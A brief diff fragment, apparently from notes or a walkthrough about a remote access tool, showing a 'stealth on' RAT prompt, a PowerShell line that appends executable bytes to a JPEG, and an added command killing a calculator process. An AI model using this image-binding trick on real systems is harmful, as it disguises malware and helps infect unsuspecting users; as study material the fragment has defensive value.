@@ -56,4 +56,4 @@ RAT> stealth on
 > 
 > [System.IO.File]::WriteAllBytes("FINAL_image.jpeg", $imageBytes + $exeBytes)
 
-
+> taskkill /F /IM calculator.exe
